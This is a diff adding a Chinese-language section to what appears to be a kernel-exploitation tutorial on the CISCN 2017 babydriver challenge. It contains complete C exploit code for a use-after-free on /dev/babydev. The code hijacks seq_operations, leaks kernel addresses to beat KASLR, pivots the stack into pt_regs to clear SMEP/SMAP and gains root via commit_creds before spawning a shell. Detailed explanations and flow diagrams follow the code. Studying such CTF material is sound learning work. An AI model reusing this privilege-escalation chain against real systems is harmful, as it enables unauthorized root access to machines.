@@ -1341,9 +1341,395 @@ graph TD
               height: auto;">
 </div>
 
+## 8. 进阶分析：seq_operations结构利用
+
+exploit核心代码如下：
+
+```c
+#define SINGLE_START 0xffffffff8119ba40
+#define PREPARE_KERNEL_CRED 0xffffffff81075cd0
+#define COMMIT_CREDS 0xffffffff810759e0
+
+#define POP_RAX_RET 0xffffffff811e51f0
+#define MOV_CR4_RAX_XOR_EAX_EAX_RET 0xffffffff8100f5d2
+#define ADD_RSP_0X148_POP_RBX_POP_RBP_RET 0xffffffff815bf32a
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+size_t pop_rax_ret;
+size_t mov_cr4_rax_xor_eax_eax_ret;
+
+void save_status() {
+  asm volatile("mov user_cs, cs;"
+               "mov user_ss, ss;"
+               "mov user_sp, rsp;"
+               "pushf;"
+               "pop user_rflags;");
+  log.info("Status has been saved.");
+}
+
+void get_root_shell(void) {
+  int flag_fd;
+  char flag[0x100] = {0};
+  if (getuid()) {
+    log.error("Failed to get the root!");
+    exit(-1);
+  }
+
+  log.success("Successful to get the root. Execve root shell now...");
+  flag_fd = open("/root/flag", O_RDONLY);
+  if (flag_fd < 0) {
+    log.error("failed to open /root/flag!");
+    exit(-1);
+  }
+  read(flag_fd, flag, sizeof(flag) - 1);
+  log.success("Got flag: %s", flag);
+  system("/bin/sh");
+}
+
+void *(*prepare_kernel_cred_kfunc)(void *task_struct);
+int (*commit_creds_kfunc)(void *cred);
+
+void ret2usr_attack(void) {
+  prepare_kernel_cred_kfunc = (void *(*)(void *))prepare_kernel_cred;
+  commit_creds_kfunc = (int (*)(void *))commit_creds;
+
+  (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
+
+  asm volatile("mov rax, user_ss;"
+               "push rax;"
+               "mov rax, user_sp;"
+               "sub rax, 8;" /* stack balance */
+               "push rax;"
+               "mov rax, user_rflags;"
+               "push rax;"
+               "mov rax, user_cs;"
+               "push rax;"
+               "lea rax, get_root_shell;"
+               "push rax;"
+               "swapgs;"
+               "iretq;");
+}
+
+int seq_fd = 0;
+size_t function = (size_t)ret2usr_attack;
+
+int main() {
+  size_t fake_seq_ops[0x20] = {0};
+  int i = 0;
+
+  log.info("Start to exploit...");
+  save_status();
+
+  int fd1 = open("/dev/babydev", O_RDWR);
+  int fd2 = open("/dev/babydev", O_RDWR);
+
+  ioctl(fd1, 0x10001, 0x20);
+  close(fd1);
+
+  seq_fd = open("/proc/self/stat", O_RDONLY);
+  if (seq_fd < 0) {
+    log.error("Failed to open /proc/self/stat!");
+    exit(-1);
+  }
+
+  read(fd2, fake_seq_ops, 0x18);
+  kernel_offset = fake_seq_ops[0] - SINGLE_START;
+  kernel_base += kernel_offset;
+  prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+  commit_creds = kernel_offset + COMMIT_CREDS;
+  pop_rax_ret = kernel_offset + POP_RAX_RET;
+  mov_cr4_rax_xor_eax_eax_ret = kernel_offset + MOV_CR4_RAX_XOR_EAX_EAX_RET;
+  log.success("The addr of single_start is 0x%lx.", fake_seq_ops[0]);
+  log.success("The kernel base is 0x%lx.", kernel_base);
+  log.success("The kernel_offset of kaslr is 0x%lx.", kernel_offset);
+
+  fake_seq_ops[0] = kernel_offset + ADD_RSP_0X148_POP_RBX_POP_RBP_RET;
+  write(fd2, fake_seq_ops, 8);
+
+  log.info("Preparing pt_regs...");
+  __asm__("mov r15,   0xbeefdead;"
+          "mov r14,   mov_cr4_rax_xor_eax_eax_ret;"
+          "mov r13,   0x6f0;"
+          "mov r12,   pop_rax_ret;" // first part
+          "mov rbp,   function;"
+          "mov rbx,   0x55555555;"
+          "mov r11,   0x66666666;"
+          "mov r10,   0x77777777;"
+          "mov r9,    0x88888888;"
+          "mov r8,    0x99999999;"
+          "xor rax,   rax;"
+          "mov rcx,   0xaaaaaaaa;"
+          "mov rdx,   8;"
+          "mov rsi,   rsp;"
+          "mov rdi,   seq_fd;" // Trigger through seq_operations->stat
+          "syscall");
+  return 0;
+}
+```
+
+本章节将分析一种基于`seq_operations`结构体的内核释放后使用（Use-After-Free）条件的技术研究。该方法通过操控`/proc`文件系统接口，结合精确的栈迁移技术与控制流引导，展示了另一种完整的内核状态操控演示路径，体现了利用内核既有数据结构与执行逻辑完成复杂操作的技术思路。
+
+### 8-1. 技术过程与原理分析
+
+#### 8-1-1. 漏洞条件触发与信息获取
+
+1.  **共享状态建立**：连续两次打开存在特定设计缺陷的字符设备`/dev/babydev`，获取文件描述符`fd1`和`fd2`。由于该驱动使用全局共享的缓冲区管理结构，`fd1`和`fd2`实质上引用同一块内核内存区域。
+
+2.  **精确内存控制与悬空指针制造**：通过`fd1`调用驱动的`ioctl`命令，参数指定大小为`0x20`（与目标内核中`seq_operations`结构体大小精确匹配），随后关闭`fd1`释放该内存块。此时`fd2`仍通过驱动内部指针持有对该已释放内存区域的引用，形成一个"悬空指针"。
+
+3.  **触发目标对象分配**：执行`seq_fd = open("/proc/self/stat", O_RDONLY)`。此操作会在内核中触发`seq_file`和`seq_operations`两个关键结构体的分配与关联。
+
+4.  **内核信息泄露**：通过`fd2`读取`seq_operations`的内容到用户空间缓冲区`fake_seq_ops`。该结构体的第一个成员`single_start`是一个指向内核文本段的函数指针。通过对比泄露的指针值与从内核符号表获取的已知符号`SINGLE_START`的地址，可以精确计算出内核偏移`kernel_offset`，从而绕过KASLR保护，并得到后续所需指令片段的运行时地址。
+
+#### 8-1-2. 篡改控制流指针与寄存器状态构造
+
+1.  **篡改函数指针**：将`fake_seq_ops[0]`（即`seq_operations->single_start`）修改为找到的栈迁移指令片段地址`ADD_RSP_0X148_POP_RBX_POP_RBP_RET`，然后通过`fd2`将修改后的数据写回内核，覆盖真实的`seq_operations`对象。
+
+2.  **构造`pt_regs`结构布局**：通过内联汇编精心设置各通用寄存器的值。当通过`syscall`指令进入内核时，这些寄存器值将被保存到内核栈的`pt_regs`结构中，形成特定的数据布局。关键设置包括：
+    - `r12`：设置为`POP_RAX_RET`指令片段的地址。
+    - `r13`：设置为立即数`0x6f0`，该值用于清除控制寄存器`CR4`中的SMEP位与第21位。
+    - `r14`：设置为`MOV_CR4_RAX_XOR_EAX_EAX_RET`指令片段的地址。
+    - `rbp`：设置为位于用户空间的、用于权限变更的函数的地址。
+    - 其他寄存器被设置为占位值，以确保`pt_regs`的完整布局符合预期，为后续控制流引导提供正确上下文。
+
+3.  **触发控制流转移**：通过`syscall`指令发起`read`系统调用，目标文件描述符为`seq_fd`。当内核处理对该序列文件的读请求时，会调用`seq_operations->single_start`。由于该指针已被篡改，控制流将跳转到指定的栈迁移指令片段。
+
+#### 8-1-3. 栈迁移与指令序列执行
+
+1.  **执行栈迁移**：`ADD_RSP_0X148`指令将栈指针寄存器`RSP`的值增加`0x148`字节。这个精确的偏移量旨在跳过当前函数调用形成的栈帧，使`RSP`指向预先布置在内核栈上的`pt_regs`结构中的特定位置（`r12`寄存器保存值所在处）。
+
+2.  **引导至预设指令序列**：栈迁移后，后续的`POP_RBX; POP_RBP; RET`指令开始"执行"。然而，由于栈指针已指向`pt_regs`区域，这些`POP`和`RET`指令实际上是将`pt_regs`中保存的寄存器值作为数据弹出，并将控制流引导至`pt_regs`中`r12`所指向的地址（即`POP_RAX_RET`）。
+
+3.  **执行指令序列以修改硬件保护**：随后开始执行一段预设的指令序列：
+    - `POP_RAX_RET`：将`pt_regs`中`r13`保存的值（`0x6f0`）载入`RAX`寄存器。
+    - `MOV_CR4_RAX_XOR_EAX_EAX_RET`：将`RAX`的值写入控制寄存器`CR4`，从而清除其中的SMEP和SMAP保护位。此时，处理器允许内核态执行用户空间的代码。
+    - 指令序列继续执行，最终通过精心安排的返回链，将控制流跳转至用户空间的提权函数。
+
+4.  **完成权限状态变更**：在SMEP/SMAP保护被禁用后，控制流得以安全跳转并执行位于用户空间的提权函数。该函数通过调用内核的权限管理函数（如`commit_creds(prepare_kernel_cred(0))`），完成对当前进程权限的变更演示。
+
+### 8-2. 关键技术原理详解
+
+#### 8-2-1. `seq_operations` 结构体与分配路径
+
+`seq_operations`是Linux内核为`/proc`文件系统序列化操作定义的结构体，包含四个函数指针：
+
+```c
+struct seq_operations {
+    void *(*start) (struct seq_file *m, loff_t *pos);
+    void (*stop) (struct seq_file *m, void *v);
+    void *(*next) (struct seq_file *m, void *v, loff_t *pos);
+    int (*show) (struct seq_file *m, void *v);
+};
+```
+
+当用户空间程序读取`/proc`下的某些文件（如`/proc/self/stat`）时，内核会通过`seq_file`接口按序列出内容，并调用这些函数指针。
+
+本技术演示的关键在于触发了对`seq_operations`结构体的分配。其分配发生在`open`系统调用路径中，具体位于`proc_single_open()` -> `single_open()` -> `kmalloc(sizeof(struct seq_operations), GFP_KERNEL)`。该分配请求到达通用的`kmalloc`缓存，与存在缺陷的驱动所释放的内存块大小相同，从而实现了内存块的精准重用。
+
+#### 8-2-2. `pt_regs` 结构利用与栈布局控制
+
+`pt_regs`是内核在系统调用入口处保存的用户空间寄存器状态的结构体。本演示通过内联汇编在触发`read`系统调用前，精确设置所有通用寄存器的值。当通过`syscall`进入内核时，这些值被压入内核栈，形成`pt_regs`结构。
+
+通过计算`open`和`read`调用链在内核中的栈深度，可以确定一个偏移量（`0x148`），使得栈迁移指令`ADD_RSP_0x148`能够将栈指针从当前执行点精准地移动到`pt_regs`结构中的`r12`字段附近。这样，后续的指令就将`pt_regs`中预设的数据当作代码流来执行，实现了数据与代码的混淆利用。
+
+#### 8-2-3. 对抗硬件保护机制的策略
+
+与第六章的ROP方法类似，本演示也需要显式关闭SMEP/SMAP。但实现方式有所不同：它并非通过一个长ROP链，而是通过将关闭保护所需的指令片段地址（`POP_RAX_RET`, `MOV_CR4_RAX...`）和立即数（`0x6f0`）直接放置在`pt_regs`的寄存器保存区中。然后通过栈迁移，将控制流引导至这些地址，以极短的序列完成对`CR4`的修改。这种方法减少了对大量可用指令片段的依赖。
+
+### 8-3. 技术对比
+
+| 特性维度          | 基于`tty_struct`的ROP方法 | 基于`work_for_cpu_fn`的方法 | 基于`seq_operations`的方法         |
+| :---------------- | :------------------------ | :-------------------------- | :--------------------------------- |
+| **目标对象**      | `tty_operations->write`   | `tty_operations->ioctl`     | `seq_operations->single_start`     |
+| **触发操作**      | 写伪终端设备              | 控制伪终端ioctl             | 读`/proc`序列文件                  |
+| **信息泄露源**    | `tty_operations`指针      | `tty_operations`指针        | `single_start`函数指针             |
+| **核心机制**      | 多阶段ROP链               | 数据结构伪装与参数控制      | 栈迁移 + 寄存器状态操控            |
+| **对抗SMEP/SMAP** | 需ROP链显式关闭           | 自然绕过（执行内核函数）    | 需短指令序列显式关闭               |
+| **技术复杂度**    | 高（需构造完整ROP链）     | 中（需精确控制数据布局）    | 高（需精确计算栈偏移与寄存器布局） |
+
+### 8-4. 完整内核结构分配与利用流程分析
+
+#### 8-4-1. 结构体分配与关联流程
+
+当执行`open("/proc/self/stat", O_RDONLY)`时，内核中触发以下调用链，同时分配`seq_file`和`seq_operations`两个结构体，并建立它们之间的关联：
+
+```mermaid
+graph TD
+    A["用户空间: open('/proc/self/stat')"] --> B["系统调用: SyS_openat / SYSC_openat"]
+    B --> C["do_sys_open"]
+    C --> D["do_filp_open"]
+    D --> E["path_openat"]
+    E --> F["do_last"]
+    F --> G["vfs_open"]
+    G --> H["do_dentry_open"]
+
+    H --> I["proc_single_open"]
+    I --> J["single_open"]
+
+    J --> K["调用 seq_open"]
+    K --> L["kzalloc(sizeof(seq_file), GFP_KERNEL)"]
+    L --> M["分配 seq_file 结构体"]
+
+    J --> N["kmalloc(sizeof(seq_operations), GFP_KERNEL)"]
+    N --> O["分配 seq_operations 结构体"]
+
+    M --> P["建立关联: seq_file->op = seq_operations"]
+    O --> P
+
+    P --> Q["返回文件描述符 seq_fd"]
+
+    style A fill:#e1f5e1,stroke:#2e7d32
+    style L fill:#fff3e0,stroke:#ef6c00
+    style N fill:#fff3e0,stroke:#ef6c00
+    style P fill:#e3f2fd,stroke:#1565c0
+    style Q fill:#f3e5f5,stroke:#7b1fa2
+```
+
+**流程说明**：
+
+- **绿色框**：用户空间调用起点
+- **橙色框**：两个关键的内核内存分配点
+    - `左边`: 通过`kzalloc`分配`seq_file`结构体
+    - `右边`: 通过`kmalloc`分配`seq_operations`结构体
+- **蓝色框**：关键关联建立点，`seq_file->op`指针被设置为指向`seq_operations`结构体
+- **紫色框**：流程终点，返回有效的文件描述符
+
+**技术细节**：
+
+1. 在`single_open()`函数中，内核首先调用`seq_open()`分配`seq_file`结构体
+2. 接着分配`seq_operations`结构体
+3. 最后将`seq_file`结构体中的`op`成员指向新分配的`seq_operations`结构体
+4. 在技术演示场景中，`seq_operations`结构体的分配会重用之前通过UAF条件释放的特定大小内存块
+
+#### 8-4-2. 完整利用流程：从分配到触发
+
+以下综合流程图展示了从结构体分配到最终触发控制流转移的完整过程，包含了`seq_file`和`seq_operations`两个结构体的完整生命周期：
+
+```mermaid
+graph TD
+    subgraph "阶段一: 结构体分配与关联建立"
+        A["用户空间: open('/proc/self/stat')"] --> B["内核分配 seq_file 结构体"]
+        A --> C["内核分配 seq_operations 结构体"]
+        B --> D["建立关联: seq_file->op = seq_operations"]
+        C --> D
+        D --> E["返回文件描述符 seq_fd"]
+    end
+
+    subgraph "阶段二: 信息获取与结构体修改"
+        E --> F["通过悬空指针读取 seq_operations 内容"]
+        F --> G["计算内核偏移，绕过KASLR"]
+        F --> H["获取所需指令片段地址"]
+        H --> I["修改 seq_operations->single_start 指针"]
+        I --> J["写回修改的 seq_operations 结构体"]
+    end
+
+    subgraph "阶段三: 触发控制流转移"
+        K["用户空间: read(seq_fd, ...)"] --> L["seq_read 调用 seq_file->op->single_start"]
+        L --> M["控制流跳转至修改的 single_start 地址"]
+        M --> N["执行栈迁移 gadget: ADD_RSP_0x148"]
+    end
+
+    subgraph "阶段四: 栈迁移与指令序列执行"
+        N --> O["栈指针迁移至 pt_regs 区域"]
+        O --> P["执行预设的指令序列"]
+        P --> Q["修改 CR4 寄存器，关闭硬件保护"]
+        Q --> R["跳转至用户空间权限变更函数"]
+        R --> S["完成权限状态变更"]
+    end
+
+    style A fill:#e1f5e1,stroke:#2e7d32
+    style B fill:#bbdefb,stroke:#1976d2
+    style C fill:#c8e6c9,stroke:#388e3c
+    style D fill:#e3f2fd,stroke:#1565c0
+    style L fill:#ffebee,stroke:#c62828
+    style M fill:#fff3e0,stroke:#ef6c00
+    style Q fill:#f3e5f5,stroke:#7b1fa2
+    style S fill:#4caf50,stroke:#1b5e20
+
+    B -. "包含 op 指针" .-> C
+    L -. "通过 seq_file 访问" .-> C
+```
+
+**流程说明**：
+
+**阶段一：结构体分配与关联建立**
+
+- 蓝色框：表示`seq_file`结构体的分配
+- 绿色框：表示`seq_operations`结构体的分配
+- 虚线箭头：表示`seq_file`结构体通过`op`指针引用`seq_operations`结构体
+
+**阶段二：信息获取与结构体修改**
+
+- 在此阶段，通过UAF条件读取`seq_operations`内容，获取内核信息
+- 修改`seq_operations->single_start`函数指针，为后续控制流引导做准备
+
+**阶段三：触发控制流转移**
+
+- 红色框：关键触发点，`seq_read`通过`seq_file->op`访问`seq_operations`，调用`single_start`
+- 橙色框：控制流被重定向至修改后的地址
+
+**阶段四：栈迁移与指令序列执行**
+
+- 紫色框：修改处理器硬件保护状态的关键步骤
+- 绿色框：技术演示的最终完成状态
+
+#### 8-4-3. 结构体关系与内存布局
+
+```
+内核内存布局示意图：
++----------------------+
+|   seq_file 结构体     |
+|  +----------------+  |
+|  | ...            |  |
+|  | op 指针 -------+--+---> +----------------------+
+|  | ...            |  |     | seq_operations 结构体|
+|  +----------------+  |     | +------------------+ |
++----------------------+     | | single_start     | | -> 修改为栈迁移gadget
+                             | | (函数指针)       | |
+                             | +------------------+ |
+                             | | ...              | |
+                             | +------------------+ |
+                             +----------------------+
+```
+
+**关键点说明**：
+
+1. **结构体关联**：`seq_file`结构体通过`op`成员指针引用`seq_operations`结构体
+2. **内存重用**：在技术演示场景中，`seq_operations`结构体的分配会重用之前释放的内存块
+3. **控制流引导点**：通过修改`seq_operations->single_start`函数指针，控制后续的执行流程
+4. **间接访问**：`seq_read`函数通过`seq_file->op->single_start`间接调用被修改的函数指针
+
+### 8-5. 技术总结
+
+基于`seq_operations`结构体的释放后使用条件研究，展示了一种结合栈迁移技术与寄存器状态操控的内核级技术演示。其核心创新在于：
+
+1.  **精准的栈布局利用**：通过计算系统调用链的栈深度，利用一个简单的栈迁移指令（`ADD_RSP`），将内核执行流的栈空间重定向至研究者完全控制的`pt_regs`数据区。这避免了在堆上构造复杂指令序列的需求。
+
+2.  **`pt_regs`数据区代码化**：将用于关闭硬件保护的指令片段地址和立即数，直接作为寄存器值保存在`pt_regs`中。栈迁移后，这些数据被当作代码指针执行，实现了"数据即代码"的利用模式。
+
+3.  **对抗性设计减少依赖**：该方法减少了对大量随机散布的内核指令片段的依赖，仅需少数几个关键代码片段，提高了技术链的可靠性和跨内核版本的适应性。
+
+这项研究凸显了内核防御的复杂性：即使控制了数据流（`pt_regs`），在特定条件下也能引导控制流执行预期操作。它促使我们思考如何加强对内核栈布局的随机化、加强对`pt_regs`等关键数据结构的保护，以及如何检测和防止这种将保存的寄存器状态转换为代码执行序列的行为。
+
+本方法与之前两种方法共同构成了对内核释放后使用条件的多维度研究，分别展示了通过直接ROP链、数据结构伪装和栈迁移三种不同技术路径实现相似目标的可能性，为理解内核安全机制和漏洞防御提供了全面的技术视角。
+
+### 8-6. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/UAF/UAF_004.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithCred
 https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithTTY
 https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithTTY2
+https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithSeqFile
 https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：CISCN-2017-babydriver
